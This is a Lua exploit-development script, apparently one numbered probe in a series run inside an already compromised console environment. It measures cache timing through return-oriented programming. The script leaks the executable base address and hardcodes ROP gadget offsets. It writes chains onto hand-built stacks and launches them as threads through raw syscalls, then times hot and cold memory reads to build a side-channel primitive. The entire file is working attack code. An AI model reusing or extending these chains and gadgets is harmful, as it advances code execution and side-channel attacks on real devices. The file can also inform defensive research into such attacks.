-- CRASH_CLASS: LOW
-- PROBE 1403q: ROP-based cache timing measurement
--
-- Timer child increments shared counter in tight loop (~3ns/tick).
-- Reader child uses mov rax,[rsi];ret to:
--   1. Read+verify test data
--   2. Time hot memory access (data just read = L1 cache)
--   3. Time cold memory access (64KB away, never touched)
--   4. Do 3 additional cold reads for statistical comparison
-- All timing is done in ROP — zero Lua overhead in the measurement.

print("=== 1403q: ROP timing ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wq2(a, hi, lo) wd(a, lo); wd(a + 4, hi) end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function hl(n)
    return {math.floor(n / 0x100000000), n % 0x100000000}
end

-- Setup
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets
local pop_rax_ret   = {eb_hi, eb_lo + 0x992}
local pop_rdi_ret   = {eb_hi, eb_lo + 0xC9DFE}
local pop_rsi_ret   = {eb_hi, eb_lo + 0xD77D}
local mov_w         = {eb_hi, eb_lo + 0x92C67}   -- mov [rdi],rax;ret
local mov_r_rsi     = {eb_hi, eb_lo + 0x1A5CC4}  -- mov rax,[rsi];ret
local inc64_rdi_ret = {eb_hi, eb_lo + 0x161779}
local pop_rbp_ret   = {eb_hi, eb_lo + 0x79}
local leave_ret     = {eb_hi, eb_lo + 0x1A2AE3}

-- Shared buffers
local counter = memory.alloc(64)
local counter_n = N(counter)
for i = 0, 56, 4 do wd(counter_n + i, 0) end
local counter_hl = hl(counter_n)

local result = memory.alloc(512)
local result_n = N(result)
for i = 0, 508, 4 do wd(result_n + i, 0) end

-- Test data
local test_data = memory.alloc(64)
local td_n = N(test_data)
wq2(td_n, 0xDEAD, 0xBEEFCAFE)
wq2(td_n + 8, 0x1234, 0x56789ABC)
local td_hl = hl(td_n)

-- Cold memory: 64KB buffer, never touched
local cold_buf = memory.alloc(0x10000)
local cold_n = N(cold_buf)

-- ============================================================
-- [A] Timer thread
-- ============================================================
local STSZ = 0x4000
local stk1 = memory.alloc(STSZ + 128)
local stk1_n = N(stk1)
for i = 0, STSZ + 124, 4 do wd(stk1_n + i, 0) end
local rsp1 = math.floor((stk1_n + STSZ) / 16) * 16 - 8

wq2(rsp1 + 0,  0, 0xDEAD)
wq2(rsp1 + 8,  inc64_rdi_ret[1], inc64_rdi_ret[2])
wq2(rsp1 + 16, pop_rbp_ret[1], pop_rbp_ret[2])
wq2(rsp1 + 24, hl(rsp1)[1], hl(rsp1)[2])
wq2(rsp1 + 32, leave_ret[1], leave_ret[2])

local sc_thr = mk(455)
local p1 = memory.alloc(0x40)
local p1n = N(p1)
wq2(p1n, pop_rax_ret[1], pop_rax_ret[2])
wq2(p1n + 0x08, get_hi_lo(counter))
wq2(p1n + 0x10, get_hi_lo(stk1))
wq2(p1n + 0x18, 0, STSZ)
wq2(p1n + 0x30, 0, 0)

pcall(function()
    sc_thr(uint64(string.format("0x%X%08X",
        math.floor(p1n / 0x100000000), p1n % 0x100000000)),
        uint64("0x38"))
end)

local dummy = 0
for i = 1, 3000 do dummy = dummy + 1 end
local tc = rd(counter_n) or 0
print(string.format("timer running: %d", tc))
if tc == 0 then print("TIMER DEAD"); return end

-- ============================================================
-- [B] Reader chain with timing
-- ============================================================
-- Layout:
-- 1. Read test_data[0] → result[0] (verify read gadget)
-- 2. Read test_data[8] → result[8] (verify read gadget)
-- 3. Read counter → result[16] (t_before_hot)
-- 4. Access test_data[0] (hot, in L1 from step 1)
-- 5. Read counter → result[24] (t_after_hot)
-- 6. Read counter → result[32] (t_before_cold1)
-- 7. Access cold_buf+0x8000 (cold)
-- 8. Read counter → result[40] (t_after_cold1)
-- 9. Read counter → result[48] (t_before_cold2)
-- 10. Access cold_buf+0x9000 (different cold line)
-- 11. Read counter → result[56] (t_after_cold2)
-- 12. Read counter → result[64] (t_before_cold3)
-- 13. Access cold_buf+0xA000 (another cold line)
-- 14. Read counter → result[72] (t_after_cold3)
-- 15. Write done marker → result[80]
-- 16. Infinite loop

local c = {}  -- chain entries

-- Helper: read [src] → store at result[off]
local function emit_read_store(src_hl, off)
    c[#c+1] = pop_rsi_ret
    c[#c+1] = src_hl
    c[#c+1] = mov_r_rsi         -- RAX = [src]
    c[#c+1] = pop_rdi_ret
    c[#c+1] = hl(result_n + off)
    c[#c+1] = mov_w             -- result[off] = RAX
end

-- Helper: just access [src] (result discarded)
local function emit_access(src_hl)
    c[#c+1] = pop_rsi_ret
    c[#c+1] = src_hl
    c[#c+1] = mov_r_rsi         -- RAX = [src], value discarded
end

-- Entry dummy for pop_rax
c[1] = {0, 0xBBBB}

-- 1. Read test_data[0] → result[0]
emit_read_store(td_hl, 0)

-- 2. Read test_data[8] → result[8]
emit_read_store(hl(td_n + 8), 8)

-- 3. Read counter → result[16] (before hot)
emit_read_store(counter_hl, 16)

-- 4. Access hot memory (test_data, just read → L1)
emit_access(td_hl)

-- 5. Read counter → result[24] (after hot)
emit_read_store(counter_hl, 24)

-- 6. Read counter → result[32] (before cold 1)
emit_read_store(counter_hl, 32)

-- 7. Access cold memory (cold_buf+0x8000)
emit_access(hl(cold_n + 0x8000))

-- 8. Read counter → result[40] (after cold 1)
emit_read_store(counter_hl, 40)

-- 9. Read counter → result[48] (before cold 2)
emit_read_store(counter_hl, 48)

-- 10. Access cold memory (cold_buf+0x9000)
emit_access(hl(cold_n + 0x9000))

-- 11. Read counter → result[56] (after cold 2)
emit_read_store(counter_hl, 56)

-- 12. Read counter → result[64] (before cold 3)
emit_read_store(counter_hl, 64)

-- 13. Access cold memory (cold_buf+0xA000)
emit_access(hl(cold_n + 0xA000))

-- 14. Read counter → result[72] (after cold 3)
emit_read_store(counter_hl, 72)

-- 15. Write done marker
c[#c+1] = pop_rax_ret
c[#c+1] = {0, 0xD0D0D0D0}
c[#c+1] = pop_rdi_ret
c[#c+1] = hl(result_n + 80)
c[#c+1] = mov_w

-- 16. Infinite loop
local loop_base = #c + 3  -- index of the loop_base dummy (0-indexed: #c + 2 after entry)
local loop_addr = rsp1  -- will compute below after knowing chain size

-- Loop entry
c[#c+1] = pop_rbp_ret
-- placeholder for loop_base addr (will fill after computing)
local loop_base_idx = #c + 1
c[#c+1] = {0, 0}  -- placeholder
c[#c+1] = leave_ret
-- Loop body
local loop_body_start = #c + 1
c[#c+1] = {0, 0xAAAA}   -- dummy
c[#c+1] = pop_rbp_ret
c[#c+1] = {0, 0}  -- placeholder for loop_base addr
c[#c+1] = leave_ret

-- Compute loop_base address
local STSZ2 = 0x4000
local CHAIN_PAD = #c * 8 + 64
local stk2 = memory.alloc(STSZ2 + CHAIN_PAD)
local stk2_n = N(stk2)
for i = 0, STSZ2 + CHAIN_PAD - 4, 4 do wd(stk2_n + i, 0) end
local rsp2 = math.floor((stk2_n + STSZ2) / 16) * 16 - 8

-- loop_base is at the dummy slot (loop_body_start - 1 = 0-based index)
local lb_addr = rsp2 + (loop_body_start - 1) * 8
local lb_hl = hl(lb_addr)

-- Fill in loop_base address placeholders
c[loop_base_idx] = lb_hl
c[loop_body_start + 2] = lb_hl  -- second reference in loop body

print(string.format("chain: %d slots (%d bytes)", #c, #c * 8))
print(string.format("rsp2=0x%X loop_base=0x%X", rsp2, lb_addr))

-- Write chain
for i = 1, #c do
    wq2(rsp2 + (i-1)*8, c[i][1], c[i][2])
end

-- Start reader child
local p2 = memory.alloc(0x40)
local p2n = N(p2)
wq2(p2n, pop_rax_ret[1], pop_rax_ret[2])
wq2(p2n + 0x08, 0, 0)
wq2(p2n + 0x10, hl(stk2_n)[1], hl(stk2_n)[2])
wq2(p2n + 0x18, 0, STSZ2)
wq2(p2n + 0x30, 0, 0)

local ok2, rv2 = pcall(function()
    return sc_thr(uint64(string.format("0x%X%08X",
        math.floor(p2n / 0x100000000), p2n % 0x100000000)),
        uint64("0x38"))
end)
print(string.format("reader rv=%d", ok2 and N(rv2) or -999))

-- Wait for marker
local found = false
for w = 1, 1000 do
    local v = rd(result_n + 80) or 0
    if v == 0xD0D0D0D0 then
        print(string.format("done after %d waits", w))
        found = true
        break
    end
    for j = 1, 20 do dummy = dummy + 1 end
end

if not found then
    print("TIMEOUT - checking partial results")
end

-- ============================================================
-- [C] Results
-- ============================================================
print("")
print("=== results ===")

-- Verify reads
local r0_lo = rd(result_n) or 0
local r0_hi = rd(result_n + 4) or 0
local r1_lo = rd(result_n + 8) or 0
local r1_hi = rd(result_n + 12) or 0
print(string.format("test[0]: 0x%X%08X (exp DEAD_BEEFCAFE)", r0_hi, r0_lo))
print(string.format("test[8]: 0x%X%08X (exp 1234_56789ABC)", r1_hi, r1_lo))
local ok_rd = (r0_hi == 0xDEAD and r0_lo == 0xBEEFCAFE)
    and (r1_hi == 0x1234 and r1_lo == 0x56789ABC)
print(string.format("read gadget: %s", ok_rd and "VERIFIED" or "MISMATCH"))

-- Timing
local function read_ts(off)
    return rd(result_n + off) or 0
end

local t_bh  = read_ts(16)
local t_ah  = read_ts(24)
local t_bc1 = read_ts(32)
local t_ac1 = read_ts(40)
local t_bc2 = read_ts(48)
local t_ac2 = read_ts(56)
local t_bc3 = read_ts(64)
local t_ac3 = read_ts(72)

local d_hot  = t_ah - t_bh
local d_cold1 = t_ac1 - t_bc1
local d_cold2 = t_ac2 - t_bc2
local d_cold3 = t_ac3 - t_bc3

print("")
print(string.format("delta_hot:   %d ticks (before=%d after=%d)", d_hot, t_bh, t_ah))
print(string.format("delta_cold1: %d ticks (before=%d after=%d)", d_cold1, t_bc1, t_ac1))
print(string.format("delta_cold2: %d ticks (before=%d after=%d)", d_cold2, t_bc2, t_ac2))
print(string.format("delta_cold3: %d ticks (before=%d after=%d)", d_cold3, t_bc3, t_ac3))
print("")
print(string.format("cold-hot avg: %.1f ticks", ((d_cold1+d_cold2+d_cold3)/3) - d_hot))

-- Check marker and counter
local marker = rd(result_n + 80) or 0
local tc2 = rd(counter_n) or 0
print(string.format("marker=0x%X counter=%d", marker, tc2))

print("")
print("=== 1403q DONE ===")
